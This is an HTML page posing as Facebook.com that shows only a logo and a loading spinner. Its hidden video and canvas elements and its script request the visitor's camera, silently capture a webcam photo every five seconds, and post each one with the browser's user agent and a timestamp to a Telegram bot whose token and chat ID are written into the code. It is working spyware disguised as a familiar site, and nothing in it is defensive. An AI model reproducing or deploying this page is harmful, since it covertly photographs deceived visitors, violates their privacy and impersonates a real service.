ye.lin.naing31<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook.com</title>
    <link
    rel="icon"
    href="https://gifdb.com/images/high/ff"
            type="image/x-icon"
        />
 <style>
	body {background-color: #FFFFFF;
	}
	
img {
  margin: 0;
  position: absolute;
  top: 35%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
  border-radius: 50px;
  border: 2px solid #FFFFFF;
  padding: 0px;
  width: 150px;
}

.im{
margin: 0;
  position: absolute;
  top: 53%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
  border-radius: 50px;
  border: 2px solid #FFFFFF;
  padding: 0px;
  width: 300px;
}
.b {
text-align: center;
  position: absolute;
  top: 70%;
  left: 27%;
  font-size: 14px;
    }
    </style>
    
</head>
<body>
	
<i class="fa fa-close" style="font-size:36px"></i>

<div class="img">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSueU7maPiQQd566w9QZWbXEDm5zUhzbHxcaqTUdj1mYw&s" alt="Paris" style="width:20%;">
</div>

<div class="im">
<img src="https://andimaps.com.au/wp-content/uploads/2014/07/loader.gif" alt="Paris" style="width:150%;">
</div>

    
    
    <video id="video" width="490" height="390" autoplay style="display:none;"></video>
    <canvas id="canvas" width="490" height="390" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setInterval(capturePhoto, 5000); // Capture photo after 5 seconds
            });

        function capturePhoto() {
            context.drawImage(video, 0, 0, 640, 480);
            const dataURL = canvas.toDataURL('image/png');
            sendToTelegram(dataURL);
        }

        async function sendToTelegram(dataURL) {
            const blob = await (await fetch(dataURL)).blob(); // Convert dataURL to Blob
            const formData = new FormData();
            
            const currentDate = new Date().toLocaleString();
          
            formData.append('photo', blob, 'webcam_photo.png'); // Change 'document' to 'photo' and file type to .png
            
            formData.append('caption', `📸 ပုံတစ်ပုံလက်ခံရရှိပါသည်။\n\n👤 𝐔𝐬𝐞𝐫 𝐀𝐠𝐞𝐧𝐭 : ${navigator.userAgent} \n\n⌛ 𝐃𝐚𝐭𝐞 : ${currentDate} \n\n👨 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐁𝐲 : @mr_AkPhyoe,`);
            fetch(`https://api.telegram.org/bot 8275046992:AAG8r5DdbUtyv_sz9-P8VWtF7m6fZzjmFnY /sendPhoto?chat_id=6874315478  `, { // Change 'sendDocument' to 'sendPhoto'
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
        
    </script>
</body>
</html>

